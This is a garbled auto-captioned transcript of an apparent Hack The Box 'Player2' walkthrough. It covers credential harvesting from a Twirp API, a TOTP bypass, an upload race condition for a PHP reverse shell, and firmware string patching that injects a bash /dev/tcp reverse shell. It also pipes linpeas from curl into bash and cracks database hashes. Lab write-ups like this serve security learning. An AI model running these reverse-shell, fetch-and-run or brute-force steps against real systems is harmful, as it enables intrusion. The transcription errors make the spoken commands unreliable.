 what's going on YouTube the Zips I'm done play or two from hack the box and if you wanted a video on heap exploitation cuz that's the intent and Prive esque of this box unfortunately that's not this video I spent a good five to six hours on that part of the video alone and just couldn't get an explanation I really liked so I decided to cut it from the video I do have a Wacom tablet so I can draw on the screen unfortunately I just don't know how to use it so once i figure that out i will probably revisit eep exploitation the box itself is really challenging and has a handful of unintended routes that we will be exploring my favorite one is the firmer upload piece actually has a race condition if you can find the upload directory so you can just upload a web shell and get code execution without dealing with modifying the firmware and if you don't know what I'm saying I may make sense later on so let's just jump into the box as always we're gonna scroll for this pseudo and map with - SC for default scripts SV enumerate versions Oh a output or formats pin and map directory and call it player - and then the IP address which is 10 10 10 170 can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on port 22 and then we also have HTTP on port 80 the banner tells us it's an Ubuntu server both on SSH and HTTP and we don't really get all that much information so I'm gonna do a full port scan on this to run this in the background while I look at it so - P - does all ports 10-10-10 170 and will do Oh a and map player 2 - all ports and just let that run while we go take a look at the site so going to 10-10-10 170 we get a weird error message I said oops something went wrong please contact mr. reboot at player 2 HD B so it looks like we got a hostname right here so I'm just going to test this out and we'll send this over to burp suite refresh the page and I'm mainly going to add the host header or edit it and it said player 2 htb I think I'm just gonna put this in the repeater tab send it and we actually get a page so I'm going to go over into my host file and we'll add that entry so we can do 10 10 10 170 is player 2 htb save that and in Firefox will turn burp off so we can go look at the page easily so play a2 dot h DB and it looks like we get a page so the very first thing I do is control you to open the page source and I just look at kind of the headers to see if we can identify if like WP dashes and it indicates a wordpress page or something that indicates is Drupal I just want to kind of identify the service so we do see a different domain product player to htb so I'm gonna go back into my host file and we're going to put that entry so product player - HT be save that and let's see I'm going to search for dot PHP and we don't see anything dot HTML don't see anything so I want to see if I can figure out what type of server this is running on so i'm gonna try index.html and we get a not found I'll try index.php and we get a page so we know this web server now is running PHP so let's go take some notes so ctrl n to create a new node actually put player two but all well I'll be fine notes web server is running PHP on player two htb so could be handy if we ever get like a file right thing we can just try to drop a PHP web shell looking at this just reading through to see if there's anything interesting I believe this one is from the very first player machine and it's not too much there we have a contact form so I always like saying whenever there's user input to do some testing so we'll do if SEC root at please we'll do epic rocks and please subscribe to my videos or to my YouTube I guess we make sure we're on intercept mode we can drop this request send it and it does a post to slash mail so I'm just going to go to the repeater tab send the request and we just get and JavaScript box that says thank you for your visit we'll get back to you as soon as we can and it does okay so nothing really too interesting here I can try like just getting mail and we can see what happens as soon as we hit mail it just says that and redirects us we can see if we can navigate to like the actual script so we can try mail dot PHP and the same exact response happens oh we can do mail dot PHP dot back and we get not found so we know the web server is just appending dot PHP to a bunch of things so I guess that's kind of good to know I'm gonna run go Buster so we always have some type of recon running in the background and then we'll move over to look at the product domain so go Buster - you HTTP player - HDB - w forward west user share word list dirt Buster and we'll do directory lists - 3 medium text will do - oh four out file and want to make a directory for go Buster we'll put in go Buster slash player - HDB - I guess basic not out because we're not doing anything if I did like - X arguments for PHP I would probably put um player 2 dot dot h CB - PHP but I'm just looking for basic things I don't need to put a file extension on it because when we looked at male and male dot PHP they were the same so I'm gonna ignore that - save some time let's do directory mood and I think that is all we need okay so we got that go Buster running in the background and we can look at product dot player to htb and we get a login prompt so the very first thing I do is try login with like admin admin and we get a JavaScript boxes as nope and returns us so I'm gonna do some basic like SQL detection so put a bunch of special characters in it to see if anything happens and we could unmask this if I get f12 click on this little arrow go here and what it says type equals password just erase password and you can see what I put I just hand jammed a bunch of special characters but click sign-in go over to burp suite you can drop that request here's the login and I'm doing this just so I can easily identify the output I can also look at the bytes at the bottom we can send characters one at a time just in case we call some weird error but it doesn't look like anything's there if I was actually doing this machine I'd probably run sequel map in the background but I don't want to run too many programs because I'm a slow down the machine or my VM so I'm just gonna run go Buster here but in der mode - H would do was it product player - dot h TB - oh four out file opening go Buster product player - dot - basic I think is how we did before that's W for list users share word list third buster directory list - three medium I screwed something up - you probably there we go so we have a few things Oh what index is male end stuff accessible here let's try this proxy turn intercept off so on product player to HDB we get a slash male oh it is that's weird so these pages return different things but index is different so maybe index dot PHP on this if it detects the host name is product it goes one place if it goes checks it for another it goes somewhere else I don't fully understand that behavior right now but we'll just move on and see what we have there is a SRC which looks like a source directory I'm guessing anything that returns status 200 is going to be a HTTP okay and 301 is going to be a redirect so we could take a look at the slash source directory product does not have that directory we get a forbidden so we may want to try like source male dot PHP we get not found so and this one we may want to do some extensions there is a vendor and a proto directory so we can try checking those as well checking vendor we get for a bit in proto we get forbidden we have slash API that one is interesting we don't have API and the non product version so that's just not found but if we added product dot player 2 dot HT be there are some things so this is definitely interesting behavior while these go busters run we're gonna start up yet another go Buster and this one is going to be doing virtual host so I'm gonna see if I can find a word list because I don't know exactly what the one I want to use right now but I know it's gonna be under sec lists and I don't know if I have that here so we'll do sudo at search sec list sudo apt install cyclists and that is weird what if I screwed up my app depository let's just get a cyclist github ten bit sweet off and we're just manly installed this so CD opt get clone and probably good to just download it and not download it all this revision history because it looks like it's going to be a lot bigger than I need let's see is it going be faster if I just download the release issues no [Music] clone download zip that's what I was looking for because this won't contain the dot git folder I believe so it should be in theory much smaller also it being zipped up does help so let's do CP downloads and my VM is definitely starting to slug along with these to go Buster's running and Firefox it's thing about downloading close these two tabs to free up some memory oh I think I have what I need from go Buster I'm going to stop these just to free up some resources on my machine and it looks like the get has finished so we can just download it and D you - HS store I'm just looking at the file size will do get and we can see the git folder is pretty much probably double the size of this so I'm not never going to do a get poll I'm just gonna read download it I'll just delete the directory so let's go and look at fine dot - ID DNS and there is a name list Oh subdomains this looks like exactly what I want the discovery DNS what thing so let's do go Buster - H and we want to put it in DNS mode for DNS subdomain brute-forcing well now we want V host virtual host brute-forcing what is my highlight not working when I click weird something's going on with my terminal so we'll do go Buster DNS - H - look at the options it's probably the same exact thing let's see o - D is target domain so D product dot no by player 2 HT b + - w for word list and since i don't know exactly what this is I'm just gonna act movie test foot product and please subscribe so now when we do test C return the same IP o as rehearsed not DNS that's probably why the help option wasn't making too much sense to me so V Hurst and we can do let's see - you for URL product h DB and we're less we'll do tests and it looks like we'll probably be going for size so we can do word list and it's gonna be op SEC list discovery DNS so domains top million five thousand tests what do you owe go Buster rehearsed and run this and then it's gonna probably get - V on the size or maybe I'll do a sort and look at all the unique sizes but hopefully the domain name isn't part of that size which it very well could be because glancing at this the size is definitely changing so let's see yeah the size definitely does change so there's gonna be a better way to do this but I'm drawing a blank so I'm just going to try doing a grep real quick against this so do grip and then space eight and then any character zero to nine any character zero to nine and then and then bracket so if we grip that for a go Buster V host and get that do a dash V to exclude that size 900 so we can say eight to nine zero nine zero nine and that probably will work so all I'm doing here grepping anything where the size is 800 to 999 and excluding those because that's probably going to be part of this too subdomain so let this go run now that we have a way we may be able to sort through this in some type of way and as that goes we can take a look back at our end map and we do see a third port 8545 so I'm gonna do an map - a CSV - n to not do DNS because I just want to go a little bit quicker and we'll do 10 10 10 170 - P for port 8 5 4 5 and see what this outputs so and map has started it's undergoing service scan I'll rename the shell to be recon Oh we'll just name it go Buster oh it finished so we can do that grep again and we don't get anything and I just wanted to make sure that maybe product wasn't on this list sweet my copy and paste is working grant product on this it is so what we did to exclude it probably was not a good thing so grep product on go Buster V host will do product dot player to htb and right off of that we can see where we went wrong the V host is putting it at the domain level not the sub domain so go Buster V Harris - H and let's see is there a way to do this cookies follow redirects huh I don't know if this does some domains so probably put in a feature request to do that and until then we will use W fuzz so W fuzz - W forward list and we'll use that same word list I was hitting alt period to cycle through previous um commands - H the header and I'm going to go over to burp suite just to make sure I get the head or write it is host so host and this will be fuzz and flow is going to take the lines out of this so dot player to htb and then - you for URL HTTP player - HT be so this should be better and it looks like it definitely is so we can probably do - - HW to hide words of 14 and we'll see if we get any hits here what GCM cdcs that is a weird one GCM CDC s dot player - dot h DB let's just put this in rip sweet so that is the error string and it's a response code of 400 so it's not too important but we do find product and I am a little curious what if we do please subscribe same thing GC oh there's an underscore maybe it just doesn't like underscores yeah so it doesn't like an underscore and the host header so if we do please underscore subscribe and send it we get a 400 so that's probably the only one in that word list that has a under square okay that makes sense we haven't found any extra subdomains so thankfully we can probably exclude that and I'm going to close all these pains because we are finished with all the go bustering we think we need and then we see this and it's looking like nmap thinks 8545 is a web server and the web server is running PHP seven to two for Ubuntu and if we look at here we have twerp and valid route is an error message is getting so let's go and hit this box on put eight five four five and this is what we get so poor invalid route I'm going to search on that message to see exactly what we get and reading all of this and reading exactly what twerp is there's one thing that stands out and if we took better notes it would really stand out matching protobuf messages and if you looked more into protobuf you'd see their extensions end n dot proto and going back into the go Buster results we do play it to HC be basic l / proto is a directory so if we navigate to slash proto one product we just get a forbidden but I believe if we do twerp protobuf maybe and look around there's something that says they should end in dot proto so let's do a go Buster for that I guess we're not done with go Buster so go Buster - dir for directory mode - you HTTP player to HDB / what is it proto - w for list users share thir Buster word list and I'm just going to do a directory list 1.0 because I believe this one is much smaller and we probably want to do - X proto for the extension and - Oh will do go Buster I'm in go Buster's directory so we'll just do play it - proto a player - one the proto-truk tree proto maybe in the future when I look at that file name I'd like oh that's the prototype and would doing the extension for proto I don't know I don't have a goodnight way to do naming conventions with go Buster logs I just kind of wing it as I go the other thing we want to probably look at is the API directory so again if we look at go Buster we've looked at product there was this slash API directory so go Buster dir product dot player - HT b / api word list users share oh I want it SEC list as anything will do doorbuster weird list directory list we'll try one zero see if this goes any quicker and see if we get anything so right off the bat we do have a /t OTP and we should have done an out file so what would do this product API no args that should be fine and I am NOT in go Buster's directory so let this go we can take a look at slash API slash T OTP so if we go here it was product dot player two dot h TB and it was slash API slash totp take a look and we get the error message cannot get so I'm going to change the request method to be a post since it says we can't do a get request can we do a post and now we get invalid session so we could try changing a content type to be JSON and I'm just doing this because most API is interact with JSON and then we can say like session null just to see if it changes the message and there's nothing really there so I'm going to highlight this and I really should be taking one notes as I go this will be product player to h TP invalid session okay going back here to see if we have anything nothing really we could go back and potentially like brute force the eight five four five directory with go Buster but I only have so much memory allocated this machine I don't want to do too much so I'm gonna let these go Buster's finish and see if we have anything to go on with so after some time we finally got a hit on slash generated proto and this was in the URL player to dot each to be / Protel so let's go copy this go into a pain and we can curl that and it was generated proto and looking at this it is a protobuf I guess structure I'm not too familiar with protobuf I've only really heard about it from like the Pokemon go reversing because I believe Pokemon girl uses proto bluff to communicate to the servers but this is using the package tour which is a twitch TV thing and I went back and googled around the documentation if you do twerp I think curl they give you instructions on how to interact with this so the request protobuf message the reply and how to interact it looks like it's doing a request on slash twerp and I don't know if I need that so let's go and edit our request if we just go player to htb port 8 5 4 5 I think it was not index dot PHP there we go let's in this over to burp suite and examine it so turn proxy intercept on send it this request we can drop I think hey we should have dropped that send it go to repeater tab we get bad rail so I'm gonna do last clip and we still get bad route and no handler for path slash Corp I'm just putting stuff in to see if I can guess what the directory it is I don't know so I'll keep that in mind when looking through this documentation so it's doing TWRP example haberdasher haberdasher make at so looking at I don't know if they have the full protobuf message here so we'll kind of just guess looking at the protobuf file I guess let's see we'll try to rip slash the package name so let's do get put slash package name no hand left foot path get rid of this it's still the same thing so looking back at the documentation the last thing this one's capitalized and you got slash make hat see wonder how I did this maybe protobuf in JSON I really should just add the perps CA and my Firefox you should examples here we go type example haberdasher so I'm just going to copy this we can do it in cherry tree protocol and we probably want to go back to curl and let's see what they're doing so they're going to Twitter and then twerp example habit Asha okay and the next one is haberdasher with a capital H and that's the service and then they're calling I don't know what make hat is here Oh a PC make at so going back to a protobuf file we have twitter player to off and the service is off and we probably want to hit Jen creds so let's go back to burp and I think off dot off slash Jen creds Oh unsupportive method only post is allowed so let's change request method to post unexpected content type application xwf WRL encoded so going back here we can see they're doing the content type application slash JSON so we can try that so content type I screwed that up failed the first request JSON so let's try looking back at this we can do number one try this and we get something if we change number two - do we get to creds no we don't so I don't know exactly how this number is working I just tried it because I saw message and it says must be greater than zero so what if we did a number is equal to z RL same thing how about putting this in quotes same thing number is equal to text so this is weird I don't really understand it but we're getting stuff so I'm going to copy as a curl command and paste and it looks like we get something I'm gonna do Jake you Jake you command not found so sudo apt install Jake you'll yes and we'll try this again the main thing I want to do is just save all the usernames and passwords let's see cool is there - Kiel I only want Carol to print the output so Google curl do not print header see man curl remove - I do I have a - iron here I do there we go that looks better my pipe and echo after that command it'll be a bit more maybe before the command there we go it's a bit more readable this way so what we want to do is now send this to Jake you'll and we can do dot name and dot pass let's see Jake you it's been a while since I use this program put it in quotes that did not work let's try putting a plus between them and there we go so let's do + and we separate by oh this password has special characters we'll do a space syntax error UNIX shell quoting I'm gonna escape these quotes and there we go so get rid of this echo and let's clean this whole thing up because this this command is dirty so copy V gen creds Sh and we'll paste this and clean it up so let's see host host user agent we probably don't need that user agent except probably don't need this don't need the encoding C probably don't need everything up until this JSON content length I bet car will do that for me data binary we probably want and then the URL let's try this so chmod plus x Gen creds and that's looking much better so V Gen creds capital V go down and then the greater than sign to indent everything that was this sign but we'll do for I and SEC zero hundred do end at this done does this work okay so now we can direct this to a file called creds and I'm doing this because I noticed the password is different like it did zero x DF and it gave us two different passwords three different passwords so something is definitely unique there so now that we have a file called creds if we can do wcl we have a hundred of one lines if I do sort - u WC - L will know at sixteen lines so there's a lot of duplicates so let's get rid of the WC - L and I'm going to said s we're going to get rid of the quotes temp move temp - creds okay and it looks like every user has for potential passwords so we can cat creds auch print - soap - eww CL and we only get four so we can do passwords dot txt and then change the two to a one to get users text and cat pass was dot txt there we go so we can now try let's try crack map exact so back map exec - you use the dot txt - P passwords text SSH ten ten ten was it 170 and I guess this isn't fixed yet and the build hue github crack map exact hopefully when you're doing this machine that they fix is there but I think if we look at the commit history update readme one of these dev versions has some fixes maybe it's this pull request so yeah the authentication protein is fixed but we just don't have this developer version we could install it on a machine but it's easier just to work around it so right now and just know I can't use a word list for a user name and that was actually fixed I only reported it MP GN has been super helpful with crack map exec and fixed all the issues I reported to them like within 24 hours so kudos to him we can try JKR and we're just testing if any of the creds worked next will be snow scan and these all hack the box authors or em procs then snow scan so and procs and we'll see if we get any hits last one is snow scan and if that doesn't work there was one other place we could test a login product dot player to dot h DB and notes i generally always like saying we're login forms are so we could do like login forms and say SSH that URL and kind of go down the list that way when you come across creds you know where to try them nothing yet so we can use Hydra to brute force this so Hydra - L users text - P passwords text then product dot player to dot h DB and the module we want to use for Hydra is HTTP - post - forum because it is a HTTP post so test test proxy clear the queue sign in so it is a post and it's just a regular form we need these variables username password and submit so right after that we say where we want to submit to and this is submitting to probably index dot PHP since it's just slash and then we put what we want to actually submit and where the username is we do a carrot user carrot and the password you guessed it carrot pass carrot and and the quote but before we do that we actually have to say what we want what is it invalid request so we look at this and an invalid request will be nope period so you just got to put anything that is in this response now for invalid so running this we did it correctly which looks like we did we have two things 0 X D F and M procs so much try 0 x DF login so if we copy this go here turn Boop sweet off 0 x DF paste go to login shouldn't be taking this long is it going through burp suite looks like it was we got a new what see your xdf paste there we go don't know what happened there we have to factor and it's saying one-time pad put something in and we get nope and that drops us out so let's see if two factors enabled for the other user which is M procs so copy and procs paste and it is still 2 factor so let's go examine all these requests exactly what is happening see if we learn anything know about the product so 0 x DF and we will copy paste intercept on sign in I'm gonna send that to repeater send that one to repeater I don't always check portals coming up I thought I'd disable that so let's clean up a request and start labeling these you'd be surprised how much more efficient you are when you start becoming organized so this is login request and this is totp page so we submit let's just submit one intercept goes off I'm just going to HTTP history send this repeater and submit the OT could I put was one and we just get three or two found so we follow that redirection to slash it just hears here which is weird because we got nope but we just had a different behavior because in this burp window I didn't see no Pat all so send this login request and then we'll submit this again and we get nope but if we send it again we get nothing so there's something going on on the second sent right now we can see and the issue is probably after we get that note it's deleting the session and this PHP session ID when we do this login request now we have an active session on the Box session has now been destroyed because we did a login failure and without the session it redirects us so with that knowledge we can try to guess exactly what this totp thing is doing and if you remember from earlier there was a slash API slash t OTP and let's undo that edit real quick that was just that's totp what do peer TP request and this will be API API slash t OTP I think it was well it says invalid action so we had changed the content type to be JSON and then we're playing with action forget the exact error message we had got before but we do test we get missing parameters we submit this oh we don't want API we just want t OTP that's dead and now we get invalid session so when we have an active session and hit this API we get a different thing and it's missing parameters so you can fuzz this and if you did just a one missing parameters if we do zero we get a backup code and this is actually unintended this is a type confusion vulnerability I think zero means what is zero and PHP PHP - I wait PHP what's interactive mode - a there we go if zero echo success if one so one is going to be true zero is not so that's where the behavior is kind of coming from so it's probably doing a kind of like a sequel injection thing here that says if the parameter is false then display the backup codes the intended route on this piece was to guess the action is backup codes so birthers do work type confusion is a pretty cool way to do this piece but this was the intended route and if you have looked at the totp request let's log in again real quick let me grab the password so copy xdf paste disable burp sign-in what is your XD f let's see well and to go on that if you did it as a string it'll probably always oh no I'm not sure just no that's tight confusion if you want more go to 0 XD f blog if you just do 0 XD f github in case I forget at the end of the video to go over the type confusion I'm sure he's going to have a really good blog post on this machine so check that out if you want more the type confusion it's kind of hard to show it when I don't have the source in front of me right now so we'd have to get rid on the machine and then for me to remember to go back and grab that so let's see we're gonna do the password and this is actually your L encoded so I did ctrl shift you D on your L encoder and go back a few times and that's why copy and paste didn't work and it says you can either use the one-time pad that we sent to your mobile device or the backup codes you have with you so that's where the backup code thing came from so going back to burp we got a backup code here send it and we get into a new page it's taking a little while to load but you can see the pro tabs players choice so let's look at this page the learn more just goes down to what the next piece is so this looks like a one page design so just scrolling we can look at things and if we want to get early access man that animation is annoying it gives you a PDF here and then we get a contact us message or seeing if I could hide that animation but it doesn't look like it so what do if sac and root a tip sector rocks and we'll say please like this video for the YouTube algorithm so if we turn burp suite on send the message thank you for the visit we'll get back to as soon as we can and it just goes to slash mail so it looks like that slash mail is just a unprotected endpoint and that's why we could hit it there's mail dot php' both and product and not product so now everything starting to make a little more sense from earlier so looking at the PDF there's a lot about digital signatures and gives us a URL we recommend the dev team to do a sanity check at this URL before provisioning so if we select a file we can try uploading PHP web shell so let's do the test dot PHP and I'll just do PHP echo please subscribe we won't do a web show yeah we'll just do that if we PHP to test this it does work so what's upload was it HD be player to test dot PHP open make sure burp suite is intercepting upload send internal server error so it definitely did not like that let's see we'll call this PHP upload and going back to this they give us a firmware download so let's just download this w get and I'm going to upload this back to the server and we'll see what differs between these two requests so we can go back drop back there we go so we want to do this firmware rip sweet upload and this doesn't so looking at this request let's see where is the mime type for this it's doing application extra so if we change this to send we still get a server error so what I'm going to do this will be legit upload let's change this to be at our archive because it's expecting an archive maybe it's trying to unarchive it and then failing so let's do what is it tired-ass see bf please sub tar and test dot PHP so we put that file in so we can go back here and we're going to go through this upload the next one so this will be please subscribe to our interceptors on upload and it couldn't verify the signature so at least we got a little bit farther so we know there is some type of signing on this and we really wanted to we could maybe look for it uploads a directory so maybe there's a pro tabs slash uploads whoops I did not copy so if we go product dot player to HT b / pro tabs upload uploads uploads gives a 301 so we know that directory exists we can try test dot PHP not found so I'm gonna do 4i and SEC 0 to 100 - dev null so we hide error messages and we forgot to put do did not work as I expected see I won't if I do yeah we'll just go like this okay send looks like we were actually getting something so right here we do get something so we now have a way to potentially execute code because yeah if I put an actor statement here and like do line breaks between the requests and it may be more apparent so let's try something so let's go back to test dot PHP and let's do a reverse shell so locate PHP - reverse sweet I have one here so we can copy this to test dot PHP V test dot PHP and we have to edit the IP and this script Oh so we they've changed the script to actually allow you to set IP via an argument that's cool but not going to use it or just hard code it 1010 14 - is my IP I believe yep and then the port we're going to use is 9001 okay so n CL v NP Oh before we do that we'll probably have to tar this back up and then we can do n CL v NP 9001 and let's go and redo this yeah yeah intercept on sweat file please sub tar upload and the main reason I went first to like hunting for upload directories if it's checking signatures it probably has to extract something out of the tarik I've to check the signature so that's kind of why I made that one jump let's do shell and see if this works oh we need to start that loop with a KO command so for AI n was up here yeah so down here we'll just do n CL VMP 9001 and Ana go back here send this and we get a shell as dub-dub-dub data and this was actually unintended will do the intended way real quick before I do that I just want to see if my actual like requests have hung yes it's funny what send this a few times there just hang the web server doing it this way hold on that's funny no I do not hang the web server okay I may have hung this upload process though let's try up learning the firmware again nope I'm actually not sure oh I guess the curl command doesn't complete so since the curl commands not completing it's not going past it but that is the way I did to get a shell we'll go and do the intended route now so the antenna route is looking at this firmware so let's make the firmware move the thing into the firmware directory and then turn xvf the firmware and we get three files so cat info text this is just I guess a disclaimer cat version this is firmware version and then you got the tar archive so I'm going to remove the tar so I left with the firmware we haven't looked at which is pro tabs not bin we do a file against it it just says we do strings against it it definitely looks like an elf like there's a lot of interesting things here that just scream it's an elf with jealousy and things like that we can then walk it to see exactly what this is and we see at X 40 or decimal 64 into this it finds an elf and you can do the cheat way and just do like - me2 extract it what - II to extract I don't know why it's actually not distract extracting weird bin one can extract of course the demo gods are just me not using it that often in this fashion it's not extracting generally how I like curving things out of this because when you do a lot of firmware stuff to notice that being walked as Flags are a lot of things I like just using DD to manually curve stuff out maybe if I do pseudo know this is actually bothered me now let's try man bin walk and search for extract so extract known file types - D prototype so let's try bin walk - D elf do ALS and there we go it finally extracted it for some reason maybe it's not set to auto extract elfs but that's how you can do it's been walk like I said before I really like doing it manually wooden Ben walked because if you ought to extract things it can quickly fill up your disk without you realizing it and for some reason that always happens to me so let's just go back to the Benoit command and we see it starts at 64 bytes into the file so I'm just gonna do a DDI F and then we can do equals pro tip in pro tabs dot bin or prot abs jump in I don't know how to pronounce this thing Oh F is equal to pro tabs dot elf and then we're going to do skip equals 64 and we can set the block size to whatever you want I'm just gonna set it to 1 and what this did was DD input file take this output file send it here skip the first 64 of one so we just skipped the very first block or the first 64 bytes and if we wanted to grab the first 64 we can do dot head count is equal to 1 and block size equal to 64 so the block size is how much it's going to grab before it writes essentially so setting the block size to 64 and saying the count is 1 means we're only going to do one block so if we do enter now we can see 64 bytes have come in copied if we do two you can see 128 so that's how that piece works so now we a split the blob of data into two things we have the header which is going to be random text this is probably the signature and then we have the elf which is a Linux binary so I'm going to open up and Diedre and I'm going to see exactly what this is new project player to firmware the project name will be what is this from where I'm gonna make the director eg draw so make sure I'll call it reverse I'm just doing that because gauge or gauge rip puts a bunch of files so if I did LS and reverse we can see all the files there if I didn't put it in a directory it would just pollute my directory I'm gonna look at this elf analyze it won't select all and see exactly what this is if I go over to the functions we can see it's not stripped so I have all the symbols and names and looks like I didn't set the size of this pain I wonder if I can do properties display is there text size font 16 y sweet there we go so looking at main saying a bunch of buffers puts sleep sleep print ASCII art it doesn't really do all that much so we can look at what this wait for F key is and looking in this it does to system commands so system stty raw - echo min0 time 10 and system s TTY sane so let's take a look if we can modify this to begin with so what I'm going to do is we'll open Pro tabs dot pin and a hex editor and I'm going to change one byte we're gonna go somewhere in here change that will put FF so exit and save oh man the theme does not like this pro tabs been let's go here CP pro table stuff in to Bend dot back I just want to save that save md5sum star dot V I so I did make a modification to this so let's package it back up so tarah dash c VF r du info we have to name it so we'll call this prototypes dot para info text prototype is up bin and version so this is how it was packaged up so we just repackaged it and we can go and upload it so where is this probably in the firmware directory upload verifying signature signature failed so did not work there let's try modifying something near the end of the file so sometimes when you do like like signature text you only check a portion the file because if you did a checksum on like a 10 gigabyte file it could take a while so sometimes people will just say ok let's just do the first 4096 bytes of the file or some stupid like that so that's what we're gonna check for now so let's copy protons dot the end up back over top of dot bin and I'm gonna do the tar command yet again because I want to make sure I'm working with something that's good so this should validate because we should just have the stock signature and it says it looks like legit and then the provisioning test is just it running so let's go back into the hex editor go way down the file and we'll change this byte so exit and save tar it back up select file and upload and we see it passed all the checks so let's go back and copy that over and we want to try editing a piece of the file that will give us code execution so if you remember in the key draw there is this system command so I'm going to search for s TTY so I'm gonna do ctrl W just search and can't see I think if I hit enter it's going to say search for string man that is I got to fix that I'm going to search for s TTY and we see in this command so I'm gonna hit tab to switch over to edit the actual ASCII I'm gonna do ping I'm going to test on my local machine ping - c1 localhost okay I always get the option - Sienne - add mixed up between Linux and windows so that's why I wanted to test it before I did this so - c1 10 10 14 - and let's up the rest of this with junk sweet okay let's control X to exit and save tar this backup pseudo TCP dump - I for interface ton zero ICMP and we can upload upload it and we get a ping several times oh god am i pinging and I don't know what I did but oh I bet it's this I have a script drawing to update this title bar to give me the latency and it's not working right there but that's what this noise is we can see player - HDB is pinging me right here so unintended side effect of that bar maybe I'll remove that so now we know we have the ping now the dangerous thing with this let's just whoops let's just exit and not save see ctrl W and a search for string ping so we want to get a reverse shell we shouldn't really in most cases go beyond the amount of space that is allocated for us because you could screw up the binary like significantly but we're gonna try not doing that try it going beyond it if you want to do it you could probably echo task - like bird dub dub dub HTML T dot pH P and then nothing and we could try that this may be a more OPSEC safe way to do this so what did I call it t dot php' okay so upload this and then if we went to like 10 10 10 170 slash t dot PHP do you exist Oh 170 it does so you could like echo a few characters at a time into this file and build a web shell but it'll take a while you could script it but this videos gonna be long anyways so let's go and see what happens if we overflow this one parameter if it even matters so we do ash - see bash - I def TCP 1010 14 - nine thousand one zero at like that I think and we'll see what happens no promises so let's exit and save and we should stir up a web shell see what happens we got one so that worked out of curiosity I do want to look at this and Ghidorah to see if Dedra freaks out about what we did so we can not save this go back we probably need to extract it again so we'll do DD we'll do elf to count 64 block size one no skip there we go so now we can open get your backup Oh key draw you draw run there we go clues open you and I'm really curious what this is gonna do elf to analyze it now select all sure the function we want is main now we can go to wait for F key and it looks like it's just taking another piece of the next string because before this wasn't there so whoever this string was used oh you can see the next system call is a bit weird so let's see is it shift print screen select the area to grab we can grab this top it to clipboard go to cherry tree scratchpad paste and now we can open the other one don't save I get a double click that but you can see since we overflowed that one string the programs doing really weird things so come on load maybe we closed it again PS e EF crap G each i/o and loaded and then it closed great sometimes it does not pay off to be impatient so load close the tip this is going definitely slow gives a few tabs has not been happy since I clear that second project I wanted it didn't like me closing that tip of the day so quickly sudo P kill Dedra yet again I'm just going to let it do its thing and load one of its because it's trying to up open that bad project yeah I don't know um I guess we can just move on this is behaving annoyingly weird I have one last thing um - RAF fw c d fw I'm dash RF reverse so we'll delete actual project deidre D to run so it doesn't have a project directory anymore is it going to be going faster there it is so didn't like something we did their new project shared oh not shared not shared make the reverse just call it that so I don't know why it started taking so long that was a weird bug or maybe I'm just really impatient come on open up so well that opens I guess we can start getting a real shell so Python lets do which Python we have Python so python - c import PTY PTY dot dot spawn been - ctrl z s TTY raw - echo hit FG enter twice and now we have a good shell here export term is equal to X term so now I can clear the screen and let's see here we can look at the verify signature script and if you guess this power name you could have probably signed your own blob and sent anything you want up to it I think 0x DF we'll go into that but if you do products slash maybe verify signature or prototypes yeah you can download the Python file so let's now import the elf this is the unmodified one so we'll just take a screenshot of the one function and look at it so you can see the difference before and after we modified that so let's see functions main wait for key shift print screen select an area copy to clipboard paste Oh God the tooltip covered it this is not my day or time right now shift print screen select an area I choose you copy paste so the very first system called that's what this should look like and since we overflowed it it's going to the next string in the binary which is user dev console utility and that is right here so we're injecting into this actual puts call if you see there and then the system call s TTY sane it's doing a portion of that so I guess how the string is referenced in the program it's grabbing a snippet of something or maybe that's maybe it's um this string and then stty saying and then this string and the binary so we over wrote three strings just writing this one string and that's why I put a semicolon at the end of this so hopefully that kind of makes sense just know when you go in a hex editor and you start editing things greater than what you're allocated to weird stuff will happen so did it matter that much here with the shell on the box let's see what do we want to do we go to /home there is a user called observer and can we grab is user our text it doesn't look like we can because of the permissions only observer can read that and we are dub dub dub data dot sh can access it so this point let's run Lin peas so let's go up one directory make two dub dub dub and then CP opt privilege escalation script awesome sweet wimpies wimpies sh Python three HTTP server curl ten ten 14 to 8 thousand Len pssh it will pipe it over to bash and let this run Lynn peas has now finished so let's go take a look at what we have okay so I don't know why that sudo version is highlighted it does say go check here so let's definitely check this out I mean maybe that sudo like underflow bug where I get exactly what it is [Music] yeah I don't it's not really being too descriptive of what's there but I don't think that's really anything it doesn't highlight the P - so it's probably just looking at one eight to one so we'll just move on um sometimes don't know things and should look at it more in depth we see a SLR is enabled useful binaries let's we'll get all the processes so my sequel I don't know what this is egress is running something so let's highlight things we want to look at scratch pad will say egress runs things MySQL hashes what is that I have no idea what that is ingress PHP so he's just running the PHP web server nothing there Cron's look normal looks normal we have of this pork I'm guessing that's with the mosque wit or whatever it is Oh 183 I think was the pork sweet baked down super-users so you may want to try to get to the egress user and then we could maybe check for a pseudo rule that's one path observer obviously as well ssh route can log into the box it's identifying an image magic mom got xml as ssh key that's funny set you IDs capabilities nothing too interesting so didn't get too much let's try bad thing if we look at slash home we only saw observer I didn't see the egress user so I'm gonna cat Etsy passwd got for EGR and we can see his home directory is that so maybe this guy is not even on the box so pseudo rules for him probably aren't going to happen because I mean all we can tell he doesn't exist so it was just an account set up probably to run some things but it doesn't hurt to look at the MySQL database let's go into slash / dub dub dub and then I think product is where the login was and since that's where the login is that's probably there's gonna be the database so cat con PHP and we can the local host of deaf DB so no password on that MySQL okay - you'd dev uh - P dev - capital D dev DB password is dev Connect - capital H localhost let's see MySQL localhost dev dev DB let's look at this MySQL connect thing I thought this is the password MySQL Connect and PHP my user my password my DB so I mix them up so the database is dev the password is dev DB there we go show tables select star from users and we can see everyone's backup code and some type of hash see echo - n WC - C forty characters that's probably a sha-1 some sha-1 some test echo - WCC 40 so we could try cracking the users we didn't get snow scan and M procs I'm guessing it's going to be random passwords as we just didn't crack it before so let's copy 0x tf's SSH into the Kraken I don't have my SH Aires key set on this is it just it and failed to be unblocked me now so I can't get in my kraken box um we can buy just joy hash cat on a VM it's gonna be slow be a cat password start text okay be test or what was I doing B hashes so we can paste all the hashes actually so we did nine e 0a this one and this one okay all the hash is there so we can do hash cat - - force before we do that we need example hashes sha probably saw one mode 100 ash cat force - M 100 then the hashes file and then the word list which is past was not text see if this even works may not work no we cracked them all so all those were valid passwords why some users couldn't log into the website I don't know but we could try all these passwords for various users so quit cat password text and we can try manually s Ewing with these so su - observer paste su - egress and if we tried all these I'm 99.9% sure it doesn't work so I don't feel like wasting a few minutes trying when I have the power of hindsight to know that doesn't only get anything so we got through MySQL we could potentially be 